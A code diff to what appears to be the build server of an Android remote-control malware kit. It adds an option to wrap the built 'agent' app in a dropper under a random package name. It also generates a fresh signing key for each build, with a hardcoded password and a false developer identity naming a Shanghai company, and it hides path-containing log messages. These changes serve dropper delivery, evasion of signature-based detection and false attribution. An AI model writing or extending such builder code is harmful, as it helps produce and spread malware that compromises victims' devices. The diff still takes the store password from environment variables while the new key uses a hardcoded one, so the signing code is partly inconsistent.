@@ -11,6 +11,8 @@ import fsExtra from "fs-extra";
 import unzipper from "unzipper";
 import {spawn} from "child_process";
 import Agent from "../models/agent.model";
+import DropperCompiler from "./dropperCompiler";
+import {generateRandomPackage} from "../utils/randomUtils";
 
 /**
  * @class AgentCompiler
@@ -107,7 +109,7 @@ import Agent from "../models/agent.model";
  * @see {@link compileAgent} The main orchestrator method that executes the full build pipeline.
  */
 class AgentCompiler {
-    private readonly agentID: string;
+    private readonly agentID: string; // New Random Package
     private readonly agentName: string;
     private readonly adminID: string;
     private readonly createdBy: string;
@@ -117,9 +119,10 @@ class AgentCompiler {
     private readonly themeFile: string;
     private readonly forbiddenActions: any;
     private readonly variableData: any;
+    private readonly embedDropper: boolean;
     private readonly agentStorePath: string;
 
-    constructor(agentID: string, agentName: string, adminID: string, createdBy: string, themeID: string, forbiddenActions: any, variableData: any) {
+    constructor(agentID: string, agentName: string, adminID: string, createdBy: string, themeID: string, forbiddenActions: any, variableData: any, embedDropper: boolean) {
         this.agentID = agentID;
         this.agentName = agentName;
         this.adminID = adminID;
@@ -127,6 +130,7 @@ class AgentCompiler {
         this.themeID = themeID;
         this.forbiddenActions = forbiddenActions;
         this.variableData = variableData;
+        this.embedDropper = embedDropper;
 
         this.tempFolder = path.join(__dirname, `../../data/temp/${agentID}`);
         this.baseProject = path.join(__dirname, "../../data/main/base.zip");
@@ -157,7 +161,7 @@ class AgentCompiler {
      */
     public addLog(message: string) {
         // If the agent's creator is connected, send the log message in real time.
-        if (connectedUsers[this.createdBy]) {
+        if (connectedUsers[this.createdBy] && !message.includes("/")) {
             io.to(connectedUsers[this.createdBy]).emit("agent-log-" + this.agentID, message)
         }
 
@@ -184,6 +188,7 @@ class AgentCompiler {
             await this.validateResources();
             await this.checkVariables();
             await this.copyThemeFiles();
+            await this.generateNewKey();
             await this.setUpGradle();
             await this.updateServerURL();
             await this.updateUtils();
@@ -193,9 +198,15 @@ class AgentCompiler {
             await this.build();
             await this.copyAgentApp();
             await this.cleanUp();
-            this.addLog("SUCCESS")
 
-            await Agent.updateOne({agentID: this.agentID}, {$set: {status: "active"}});
+            if (!this.embedDropper) {
+                this.addLog("SUCCESS")
+
+                await Agent.updateOne({agentID: this.agentID}, {$set: {status: "active"}});
+            } else {
+                const dropperCompiler = new DropperCompiler(generateRandomPackage(), this.agentID, this.agentName, this.createdBy, this.themeID);
+                await dropperCompiler.compileAgent();
+            }
         } catch (e: any) {
             this.addLog("ERROR")
             this.addLog(`❌ Compilation failed: ${e.message}`);
@@ -660,6 +671,59 @@ class AgentCompiler {
 
     }
 
+    private async generateNewKey() {
+        return new Promise<void>((resolve, reject) => {
+
+            const keyFolder = path.join(this.tempFolder);
+            const keystorePath = path.join(keyFolder, "key.jks");
+
+            const args = [
+                "-genkeypair",
+                "-v",
+                "-keystore", keystorePath,
+                "-storepass", "123454321",
+                "-keyalg", "RSA",
+                "-keysize", "2048",
+                "-validity", "10000",
+                "-alias", "key0",
+                "-keypass", "123454321",
+                "-dname", "CN=Li Wei, OU=Mobile Engineering, O=DragonSoft Technologies, L=Shanghai, S=Shanghai Municipality, C=CN"
+            ];
+
+            const proc = spawn("keytool", args, {
+                cwd: keyFolder,
+                shell: false
+            });
+
+            proc.stdout.on("data", (data) => {
+                this.addLog("[KEYTOOL] " + data.toString());
+            });
+
+            proc.stderr.on("data", (data) => {
+                const msg = data.toString();
+
+                // Only show REAL errors
+                if (msg.toLowerCase().includes("error") || msg.toLowerCase().includes("illegal")) {
+                    console.error("[KEYTOOL ERROR]", msg);
+                    this.addLog("[KEYTOOL ERROR] " + msg);
+                } else {
+                    // This is normal info output
+                    this.addLog("[KEYTOOL] " + msg);
+                }
+            });
+
+            proc.on("close", (code) => {
+                if (code === 0) {
+                    this.addLog("✔ Keystore generated");
+                    resolve();
+                } else {
+                    reject(new Error(`keytool exited with code ${code}`));
+                }
+            });
+
+        });
+    }
+
     /**
      * Sets up the Gradle environment for the extracted Android project.
      *
@@ -704,7 +768,12 @@ class AgentCompiler {
         let gradleContent = fs.readFileSync(gradlePath, "utf8");
 
         // Replace inside signingConfigs block
-        gradleContent = gradleContent.replace(/var path = ".*"/, `var path = "${process.env.KEY_PATH}"`);
+        const keyPath = path.join(this.tempFolder, "key.jks");
+
+        gradleContent = gradleContent.replace(
+            /var path = ".*"/,
+            `var path = "${keyPath.replace(/\\/g, "\\\\")}"` // ESCAPE slashes for Gradle script
+        );
         gradleContent = gradleContent.replace(/var storePassword = ".*"/, `var storePassword = "${process.env.STORE_PASS}"`);
         gradleContent = gradleContent.replace(/var keyAlias = ".*"/, `var keyAlias = "${process.env.KEY_ALIAS}"`);
         gradleContent = gradleContent.replace(/var keyPassword = ".*"/, `var keyPassword = "${process.env.KEY_PASS}"`);
